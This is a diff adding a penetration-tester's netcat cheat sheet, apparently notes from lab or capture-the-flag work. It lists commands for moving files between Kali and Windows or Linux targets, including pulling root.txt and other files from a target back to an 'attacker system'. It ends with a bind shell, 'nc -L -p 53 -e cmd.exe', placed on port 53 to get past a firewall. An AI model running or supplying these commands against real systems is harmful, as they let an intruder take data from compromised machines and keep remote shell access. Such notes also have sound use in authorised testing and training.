@@ -1,1 +1,57 @@
+- netcat (From windows to kali):
+    > kali > nc -l -p 4443 > root.txt
+    > Windows > nc.exe -w 3 10.10.14.18 4443 < root.txt
+
+- netcat (From Kali to Windows):
+    > windows > nc.exe -nlvp 127.0.0.1 4444 > incoming.exe
+    > kali > nc -nv 192.168.119.135 4444 < /path/to/file.exe 
+
+- netcat (From Kali to Linux):
+    > Linbox > nc -nlvp 3000 > incoming.sh
+    > kali > nc -w 3 192.168.131.97 3000 < incoming.sh
+
+- netcat (From linux to Kali)
+    > kali > nc -nlvp 3000 > incoming.exe
+    > Linbox  > ./nc -w 3 10.10.14.18 3000 < incoming.txt
+    OR
+    > Linbox > cat file.exe | nc 192.168.119.135 3000
+    - Make sure to CTRL-C from kali to end the session and send something else
+
+
+# Netcat
+nc -nvlp <port> < file/to/send
+
+# Netcat
+nc -nv <ip> <port> > file/to/recv
+
+
+netcat
+On the target system:
+$ nc -lvp 80 > file.txt
+On the attacker system:
+$ nc 192.168.119.1 80 < file.txt
+
+Also works the other way, to get files back to the attacker system:
+On the attacker system:
+$ nc -lvp 80 > file.txt
+On the target system:
+$ cmd.exe /c ".\nc.exe -w 3 192.168.119.1 80 < file.txt"
+
+
+Netcat
+// Receiver 
+nc 192.168.0.1 4444 < file
+
+// Sender 
+cat file | nc -nlvp 4444            // Normal file
+
+
+The beauty of Netcat really shines when you realize that you can get it listening on ANY port doing the same thing.  
+Do a little exploring and see if the firewall you may be behind lets port 53 through.  
+Run Netcat listening behind the firewall on port 53.  
+nc -L -p 53 -e cmd.exe
+
+Then from outside the firewall connect to the listening machine:
+nc -v xxx.xxx.xxx.xx 53
+
 
